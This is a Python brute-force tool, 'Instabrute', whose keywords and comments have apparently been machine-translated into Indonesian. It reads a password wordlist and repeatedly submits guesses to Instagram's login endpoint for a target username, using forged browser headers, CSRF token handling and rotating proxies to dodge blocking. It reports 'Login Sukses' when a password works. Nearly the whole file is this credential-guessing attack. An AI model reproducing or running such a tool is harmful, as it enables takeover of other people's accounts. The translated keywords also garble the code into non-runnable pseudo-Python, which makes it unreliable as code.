
'' '
DAFTAR TODO:
	Perbaiki dan jadikan fungsi proxy lebih baik
	Sortir kode lagi
	Tambahkan fungsi bantuan untuk semua pertanyaan "Ya / tidak"
	Tambahkan fungsi bantuan ke "Tekan enter untuk keluar dari input"
'' '
permintaan impor
impor json
waktu impor
impor os
impor acak
impor sys

Fungsi #Bantuan
Input def (teks):
	nilai = ''
	jika sys.version_info.major> 2:
		value = input (teks)
	lain:
		value = raw_input (teks)
	return str (nilai)

#Kelas utama
kelas Instabrute ():
	def __init __ (mandiri, nama pengguna, kata sandi = 'nd1.txt'):
		self.username = nama pengguna
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = kata sandi
		
		# Periksa apakah file kata sandi ada
		self.loadPasswords ()
		# Periksa apakah nama pengguna ada
		self.IsUserExists ()


		UsePorxy = Input ('[*] Gunakan Proxy? (Y / n):') .upper ()
		if (UsePorxy == 'Y' atau UsePorxy == 'YES'):
			self.randomProxy ()


	# Periksa apakah kata sandi ada dan periksa apakah ia mengandung kata sandi
	def loadPasswords (mandiri):
		jika os.path.isfile (self.passwordsFile):
			dengan open (self.passwordsFile) sebagai f:
				self.passwords = f.read (). splitlines ()
				passwordsNumber = len (self.passwords)
				if (passwordsNumber> 0):
					cetak ('[*]% s Kata sandi berhasil dimuat'% kata sandiNomor)
				lain:
					print ('Kata Sandi Kosong .')
					Input ('[*] Enter Untuk Keluar')
					keluar()
		lain:
			print ('Tolong buat file kata sandi bernama "% s"'% self.passwordsFile)
			Input ('[*] Enter Untuk Keluar')
			keluar()

	# Pilih proxy acak dari file proxys
	def RandomProxy (mandiri):
		plist = open ('nd2.txt'). read (). splitlines ()
		proxy = random.choice (plist)

		jika tidak proxy di self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append (proxy)
		mencoba:
			mencetak('')
			print ('[*] Periksa ip baru ...')
			print ('[*] IP publik Anda:% s'% requests.get ('http://myexternalip.com/raw', proxies = {"http": proxy, "https": proxy}, timeout = 10.0) .teks)
		kecuali Pengecualian sebagai e:
			print ('[*] Tidak dapat mencapai proxy "% s"'% proxy)
		mencetak('')


	# Periksa apakah nama pengguna ada di server instagram
	def IsUserExists (mandiri):
		r = requests.get ('https://www.instagram.com/%s/?__a=1'% self.username) 
		if (r.status_code == 404):
			print ('[*] Pengguna bernama "% s" tidak ditemukan'% nama pengguna)
			Input ('[*] Enter Untuk Keluar')
			keluar()
		elif (r.status_code == 200):
			mengembalikan True

	#Cobalah untuk masuk dengan kata sandi
	def Login (mandiri, kata sandi):
		sess = requests.Session ()

		jika len (self.CurrentProxy)> 0:
			sess.proxies = {"http": self.CurrentProxy, "https": self.CurrentProxy}

		#build meminta tajuk
		sess.cookies.update ({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '' , 'ds_user_id': ''})
		sess.headers.update ({
			'UserAgent': 'Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 54.0.2840.99 Safari / 537.36',
			'x-instagram-ajax': '1',
			'X-Diminta-Dengan': 'XMLHttpRequest',
			'asal': 'https://www.instagram.com',
			'ContentType': 'application / x-www-form-urlencoded',
			'Koneksi': 'tetap hidup',
			'Terima': '* / *',
			'Perujuk': 'https://www.instagram.com',
			'otoritas': 'www.instagram.com',
			'Tuan rumah': 'www.instagram.com',
			'Bahasa Terima': 'en-US; q = 0.6, en; q = 0.4',
			'Accept-Encoding': 'gzip, deflate'
		})

		# Perbarui token setelah masuk ke situs
		r = sess.get ('https://www.instagram.com/') 
		sess.headers.update ({'X-CSRFToken': r.cookies.get_dict () ['csrftoken']})

		# Perbarui token setelah masuk ke situs 
		r = sess.post ('https://www.instagram.com/accounts/login/ajax/', data = {'username': self.username, 'password': password}, ​​allow_redirects = True)
		sess.headers.update ({'X-CSRFToken': r.cookies.get_dict () ['csrftoken']})
		
		Respons #parse
		data = json.loads (r.text)
		if (data ['status'] == 'gagal'):
			cetak (data ['pesan'])

			UsePorxy = Input ('[*] Gunakan Proxy? (Y / n):') .upper ()
			if (UsePorxy == 'Y' atau UsePorxy == 'YES'):
				print ('[$] Coba gunakan proxy setelah gagal.')
				randomProxy () #Periksa itu, mungkin mengandung bug
			mengembalikan False

		sesi #return jika kata sandi benar 
		if (data ['authentified'] == True):
			kembali sess 
		lain:
			mengembalikan False






instabrute = Instabrute (Input ('\ r \ n \ rc1 \ r \ 033 [1; 32 Masukin Nama Akun IGnya Cuk =>'))

mencoba:
	delayLoop = int (Input ('[*] Delay:')) 
kecuali Pengecualian sebagai e:
	print ('[*] Error, perangkat lunak menggunakan nilai defult "4"')
	delayLoop = 4
cetak ('')



untuk kata sandi di instabrute.passwords:
	sess = instabrute.Login (kata sandi)
	jika sess:
		print ('=> Login Sukses Cuk% s'% [instabrute.username, password])
	lain:
		cetak ('[*] gagal login [% s]'% kata sandi)

	mencoba:
		time.sleep (delayLoop)
	kecuali KeyboardInterrupt:
		WantToExit = str (Input ('Ketik y / n untuk keluar:')). Upper ()
		if (WantToExit == 'Y' atau WantToExit == 'YES'):
			keluar()
		lain:
			terus
		
